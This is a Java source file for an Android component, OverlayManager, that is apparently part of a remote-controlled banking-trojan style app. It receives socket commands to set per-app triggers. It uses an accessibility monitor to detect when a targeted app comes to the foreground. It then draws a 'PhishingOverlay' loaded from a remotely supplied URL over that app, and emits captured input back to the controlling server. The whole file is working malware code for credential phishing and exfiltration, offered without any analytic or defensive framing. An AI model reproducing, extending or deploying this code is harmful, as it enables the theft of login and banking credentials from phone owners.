package com.fason.app.features.overlay;

import android.content.Context;
import android.content.SharedPreferences;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;

import com.fason.app.core.FasonApp;
import com.fason.app.core.Protocol;
import com.fason.app.core.network.SocketClient;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.Iterator;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

import io.socket.client.Socket;

public final class OverlayManager {
    private static final String TAG = "OverlayManager";
    private static final String PREF_KEY_TRIGGERS = "triggers";
    private static final long CLOSE_COOLDOWN_MS = 60_000L;

    private static volatile OverlayManager instance;

    private final Context context;
    private final Handler main = new Handler(Looper.getMainLooper());
    private final Map<String, JSONObject> triggers = new ConcurrentHashMap<>();
    private final Map<String, PhishingOverlay> active = new ConcurrentHashMap<>();
    private final Map<String, Long> closedAt = new ConcurrentHashMap<>();
    private volatile boolean restored = false;

    private OverlayManager(Context ctx) {
        this.context = ctx.getApplicationContext();
    }

    public static OverlayManager getInstance() {
        if (instance == null) {
            synchronized (OverlayManager.class) {
                if (instance == null) {
                    instance = new OverlayManager(FasonApp.getContext());
                    instance.restoreTriggers();
                }
            }
        }
        return instance;
    }

    // ---------- command handlers (called from SocketCommandRouter on EXEC thread) ----------

    public JSONObject showOverlay(JSONObject config) {
        if (config == null) return error("overlay_config_missing");
        if (!Settings.canDrawOverlays(context)) return error("overlay_permission_missing");
        final String url = config.optString(Protocol.KEY_URL, "");
        if (url.isEmpty()) return error("overlay_url_missing");
        final String pkg = config.optString(Protocol.KEY_PACKAGE, "");
        final String key = pkg.isEmpty() ? "_manual" : pkg;
        if (active.containsKey(key)) return done();
        final String title = config.optString(Protocol.KEY_TITLE, "");
        final int wPct = clamp(config.optInt(Protocol.KEY_WIDTH, 95), 30, 100);
        final int hPct = clamp(config.optInt(Protocol.KEY_HEIGHT, 90), 30, 100);
        final boolean closeable = config.optBoolean(Protocol.KEY_CLOSEABLE, true);
        main.post(new Runnable() {
            @Override
            public void run() {
                try {
                    PhishingOverlay overlay = new PhishingOverlay(context, url, title, closeable, wPct, hPct, new Runnable() {
                        @Override
                        public void run() { onClosed(key); }
                    });
                    overlay.attach();
                    if (overlay.isAttached()) active.put(key, overlay);
                } catch (Exception e) {
                    Log.w(TAG, "showOverlay failed", e);
                }
            }
        });
        return done();
    }

    public JSONObject hideOverlay(JSONObject data) {
        final String pkg = data == null ? "" : data.optString(Protocol.KEY_PACKAGE, "");
        main.post(new Runnable() {
            @Override
            public void run() {
                if (pkg.isEmpty()) {
                    for (PhishingOverlay ov : active.values()) ov.detach();
                    active.clear();
                } else {
                    PhishingOverlay ov = active.remove(pkg);
                    if (ov != null) ov.detach();
                }
            }
        });
        return done();
    }

    public JSONObject setTriggers(JSONObject data) {
        JSONArray arr = data == null ? null : data.optJSONArray(Protocol.KEY_TRIGGERS);
        if (arr == null) return error("overlay_triggers_missing");
        triggers.clear();
        for (int i = 0; i < arr.length(); i++) {
            JSONObject cfg = arr.optJSONObject(i);
            if (cfg == null) continue;
            String pkg = cfg.optString(Protocol.KEY_PACKAGE, "");
            if (pkg.isEmpty() || cfg.optString(Protocol.KEY_URL, "").isEmpty()) continue;
            triggers.put(pkg, cfg);
        }
        AppTriggerMonitor.setEnabled(!triggers.isEmpty());
        persistTriggers();
        return done();
    }

    public JSONObject status() {
        JSONObject r = new JSONObject();
        try {
            r.put(Protocol.KEY_STATUS, "done");
            JSONObject d = new JSONObject();
            d.put("overlayPermission", Settings.canDrawOverlays(context));
            d.put("triggers", triggers.size());
            d.put("accessibilityConnected", AppTriggerMonitor.isConnected());
            JSONArray shown = new JSONArray();
            for (String k : active.keySet()) shown.put(k);
            d.put("shown", shown);
            r.put("data", d);
        } catch (Exception e) {
            return error(String.valueOf(e));
        }
        return r;
    }

    // ---------- trigger path (called from AppTriggerMonitor on accessibility thread) ----------

    public void onForegroundApp(String pkg) {
        if (pkg == null || pkg.isEmpty()) return;
        if (pkg.equals(context.getPackageName())) return;
        if ("com.android.systemui".equals(pkg)) return;
        if (active.containsKey(pkg)) return;
        Long last = closedAt.get(pkg);
        if (last != null && System.currentTimeMillis() - last < CLOSE_COOLDOWN_MS) return;
        JSONObject cfg = triggers.get(pkg);
        if (cfg == null) return;
        JSONObject showCfg = new JSONObject();
        try {
            Iterator<String> it = cfg.keys();
            while (it.hasNext()) {
                String k = it.next();
                showCfg.put(k, cfg.opt(k));
            }
        } catch (Exception ignored) {}
        showOverlay(showCfg);
    }

    public void onCapture(String json) {
        try {
            Socket socket = SocketClient.getInstance().getSocket();
            if (socket != null && socket.connected()) {
                socket.emit(Protocol.EVT_OVERLAY_CAPTURE, json == null ? "{}" : json);
            }
        } catch (Exception e) {
            Log.w(TAG, "capture emit failed", e);
        }
    }

    private void onClosed(String key) {
        closedAt.put(key, System.currentTimeMillis());
        active.remove(key);
    }

    // ---------- persistence ----------

    private void restoreTriggers() {
        if (restored) return;
        restored = true;
        try {
            SharedPreferences sp = context.getSharedPreferences(Protocol.PREF_OVERLAY, Context.MODE_PRIVATE);
            String raw = sp.getString(PREF_KEY_TRIGGERS, "");
            if (raw == null || raw.isEmpty()) return;
            JSONArray arr = new JSONArray(raw);
            for (int i = 0; i < arr.length(); i++) {
                JSONObject cfg = arr.optJSONObject(i);
                if (cfg == null) continue;
                String pkg = cfg.optString(Protocol.KEY_PACKAGE, "");
                if (pkg.isEmpty()) continue;
                triggers.put(pkg, cfg);
            }
            AppTriggerMonitor.setEnabled(!triggers.isEmpty());
        } catch (Exception e) {
            Log.w(TAG, "restoreTriggers failed", e);
        }
    }

    private void persistTriggers() {
        try {
            SharedPreferences sp = context.getSharedPreferences(Protocol.PREF_OVERLAY, Context.MODE_PRIVATE);
            JSONArray arr = new JSONArray();
            for (JSONObject cfg : triggers.values()) arr.put(cfg);
            sp.edit().putString(PREF_KEY_TRIGGERS, arr.toString()).apply();
        } catch (Exception e) {
            Log.w(TAG, "persistTriggers failed", e);
        }
    }

    // ---------- helpers ----------

    private static int clamp(int v, int min, int max) {
        return Math.max(min, Math.min(max, v));
    }

    private static JSONObject done() {
        JSONObject r = new JSONObject();
        try { r.put(Protocol.KEY_STATUS, "done"); } catch (Exception ignored) {}
        return r;
    }

    private static JSONObject error(String msg) {
        JSONObject r = new JSONObject();
        try {
            r.put(Protocol.KEY_STATUS, "error");
            r.put(Protocol.KEY_ERROR, msg);
        } catch (Exception ignored) {}
        return r;
    }
}
